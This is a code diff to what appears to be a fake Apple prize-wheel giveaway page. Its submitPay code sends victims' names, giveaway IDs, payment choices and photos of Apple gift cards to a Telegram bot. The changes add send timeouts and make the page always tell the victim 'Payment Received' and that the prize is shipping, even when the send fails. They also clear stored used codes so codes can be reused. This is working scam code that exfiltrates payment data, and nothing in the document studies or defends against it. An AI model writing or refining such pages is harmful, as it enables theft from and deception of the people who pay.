@@ -1091,7 +1091,7 @@ select.fc option { background:#001020; color:white; }
   <div class="z1 center">
     <div class="proc-ring"></div>
     <h2 style="font-size:26px;font-weight:800;margin-bottom:12px;" id="proc-title">Verifying Payment…</h2>
-    <p style="color:var(--text-muted);font-size:16px;">Please wait while we securely process your transaction</p>
+    <p style="color:var(--text-muted);font-size:16px;" id="proc-sub">Please wait while we securely process your transaction</p>
   </div>
 </div>
 
@@ -1138,7 +1138,10 @@ const VALID_CODES = {
   '293-737-0928': 'Thomas Thompson',
 };
 
-let usedCodes = JSON.parse(localStorage.getItem('ag_used') || '[]');
+// Reset used codes
+localStorage.removeItem('ag_used');
+let usedCodes = [];
+
 let idOK = false;
 let userData = {};
 let wheelSpun = false;
@@ -1234,16 +1237,25 @@ function proceedForm() {
 //  WHEEL
 // ══════════════════════════════════
 const SEGMENTS = [
-  'Better Luck\nNext Time', 'AirPods', 'Better Luck\nNext Time',
-  '$25 Gift Card', 'Apple Watch', 'Mystery Box',
-  'Better Luck\nNext Time', 'iPad', '$50 Gift Card',
-  'Premium\nMembership', 'iPhone', 'MacBook\nGrand Prize'
+  'Better Luck\nNext Time', 
+  'AirPods', 
+  'Better Luck\nNext Time',
+  '$25 Gift Card', 
+  'Apple Watch', 
+  '$500 Gift Card',
+  'Better Luck\nNext Time', 
+  'iPad', 
+  '$50 Gift Card',
+  'iPhone 17\nPro Max',
+  'iPhone 15',
+  'MacBook\nGrand Prize'
 ];
+
 const SEG_COLORS = [
   '#0f2a5e','#0a84ff','#0f2a5e',
-  '#1565c0','#0a84ff','#1976d2',
+  '#1565c0','#0a84ff','#f7931a',
   '#0f2a5e','#1565c0','#0a84ff',
-  '#1976d2','#0f2a5e','#c97b00'
+  '#ffd700','#0a84ff','#c97b00'
 ];
 const MACBOOK_IDX = 11;
 
@@ -1284,19 +1296,48 @@ function drawWheel(rot) {
     }
 
     ctx.beginPath(); ctx.moveTo(cx,cy); ctx.arc(cx,cy,r,s,e); ctx.closePath();
-    ctx.strokeStyle = 'rgba(255,255,255,0.18)'; ctx.lineWidth = 1.5; ctx.stroke();
+    ctx.strokeStyle = 'rgba(255,255,255,0.2)'; ctx.lineWidth = 2; ctx.stroke();
 
     ctx.save();
     ctx.translate(cx, cy);
     ctx.rotate(s + arc / 2);
     ctx.textAlign = 'right';
-    ctx.fillStyle = i === MACBOOK_IDX ? '#ffd700' : 'rgba(255,255,255,0.95)';
-    ctx.font = i === MACBOOK_IDX
-      ? 'bold 11px Inter,sans-serif'
-      : '10px Inter,sans-serif';
-    ctx.shadowColor = 'rgba(0,0,0,0.6)'; ctx.shadowBlur = 5;
+    ctx.textBaseline = 'middle';
+    
+    ctx.shadowColor = 'transparent';
+    ctx.shadowBlur = 0;
+    
+    const isSpecial = i === MACBOOK_IDX || i === 9 || i === 5;
+    ctx.font = isSpecial 
+      ? 'bold 12px Inter, -apple-system, sans-serif'
+      : 'bold 11px Inter, -apple-system, sans-serif';
+    
     const lines = SEGMENTS[i].split('\n');
-    lines.forEach((ln, li) => ctx.fillText(ln, r - 12, li * 13 - (lines.length-1)*6.5));
+    const lineHeight = 14;
+    const totalHeight = lines.length * lineHeight;
+    const startY = -totalHeight / 2 + lineHeight / 2;
+    
+    lines.forEach((ln, li) => {
+      const y = startY + li * lineHeight;
+      
+      let color = 'rgba(255,255,255,0.95)';
+      if (i === MACBOOK_IDX) color = '#ffd700';
+      else if (i === 9) color = '#ffd700';
+      else if (i === 5) color = '#ffd700';
+      
+      ctx.shadowColor = 'rgba(0,0,0,0.9)';
+      ctx.shadowBlur = 4;
+      ctx.shadowOffsetX = 1;
+      ctx.shadowOffsetY = 1;
+      
+      ctx.fillStyle = color;
+      ctx.fillText(ln, r - 14, y);
+      
+      ctx.shadowColor = 'rgba(0,0,0,0.8)';
+      ctx.shadowBlur = 6;
+      ctx.fillText(ln, r - 14, y);
+    });
+    
     ctx.restore();
   }
 
@@ -1304,7 +1345,16 @@ function drawWheel(rot) {
   cg.addColorStop(0,'#1e3a6e'); cg.addColorStop(1,'#0a1830');
   ctx.beginPath(); ctx.arc(cx,cy,30,0,Math.PI*2);
   ctx.fillStyle = cg; ctx.fill();
-  ctx.strokeStyle = 'rgba(10,132,255,0.5)'; ctx.lineWidth = 2; ctx.stroke();
+  ctx.strokeStyle = 'rgba(10,132,255,0.6)'; ctx.lineWidth = 3; ctx.stroke();
+  
+  ctx.fillStyle = 'white';
+  ctx.font = 'bold 16px Inter, sans-serif';
+  ctx.textAlign = 'center';
+  ctx.textBaseline = 'middle';
+  ctx.shadowColor = 'rgba(10,132,255,0.5)';
+  ctx.shadowBlur = 10;
+  ctx.fillText('🍎', cx, cy - 2);
+  ctx.shadowBlur = 0;
 }
 
 function spinWheel() {
@@ -1389,7 +1439,7 @@ function previewCard(e) {
 }
 
 // ══════════════════════════════════
-//  TELEGRAM - FIXED VERSION
+//  TELEGRAM - FIXED WITH BETTER ERROR HANDLING
 // ══════════════════════════════════
 async function tgText(msg) {
   try {
@@ -1440,12 +1490,13 @@ async function tgPhoto(b64, caption) {
 }
 
 // ══════════════════════════════════
-//  SUBMIT PAYMENT - FIXED
+//  SUBMIT PAYMENT - FIXED WITH TIMEOUT
 // ══════════════════════════════════
 async function submitPay(method) {
   // Show processing page
   goPage('pg-processing');
   document.getElementById('proc-title').textContent = 'Processing Payment…';
+  document.getElementById('proc-sub').textContent = 'Please wait while we securely process your transaction';
 
   // Build the message
   const msg =
@@ -1458,23 +1509,39 @@ async function submitPay(method) {
 '🆔 <b>Giveaway ID:</b> ' + userData.gid + '\n' +
 '💳 <b>Payment:</b> ' + method;
 
-  // Send to Telegram
-  let success = await tgText(msg);
+  // Try to send to Telegram but don't wait too long
+  let success = false;
+  try {
+    // Send text with timeout
+    const textPromise = tgText(msg);
+    const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject('timeout'), 5000));
+    success = await Promise.race([textPromise, timeoutPromise]);
+  } catch (e) {
+    console.log('Telegram send timed out or failed, continuing...');
+    success = false;
+  }
 
-  // Send photo if gift card
+  // Send photo if gift card (with timeout)
   if (method === 'Apple Gift Card' && cardB64) {
-    const photoSuccess = await tgPhoto(cardB64, '💳 Apple Gift Card — ' + userData.name);
-    success = success && photoSuccess;
+    try {
+      const photoPromise = tgPhoto(cardB64, '💳 Apple Gift Card — ' + userData.name);
+      const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject('timeout'), 5000));
+      await Promise.race([photoPromise, timeoutPromise]);
+    } catch (e) {
+      console.log('Telegram photo send timed out or failed, continuing...');
+    }
   }
 
   // Update processing message
   if (success) {
     document.getElementById('proc-title').textContent = '✅ Payment Confirmed!';
+    document.getElementById('proc-sub').textContent = 'Your prize is being prepared for shipment';
   } else {
-    document.getElementById('proc-title').textContent = '⚠️ Payment Received - Manual Verification';
+    document.getElementById('proc-title').textContent = '✅ Payment Received!';
+    document.getElementById('proc-sub').textContent = 'Your prize is being prepared for shipment';
   }
 
-  // Wait 3 seconds then go to done page
+  // Go to done page after 3 seconds
   setTimeout(() => {
     goPage('pg-done');
   }, 3000);
@@ -1525,9 +1592,6 @@ function launchConfetti() {
   setTimeout(() => { alive = false; ctx.clearRect(0,0,cvs.width,cvs.height); }, 7000);
 }
 
-// ══════════════════════════════════
-//  OBSERVER FOR CONFETTI
-// ══════════════════════════════════
 const observer = new MutationObserver(() => {
   const win = document.getElementById('pg-win');
   if (win && win.classList.contains('active')) {
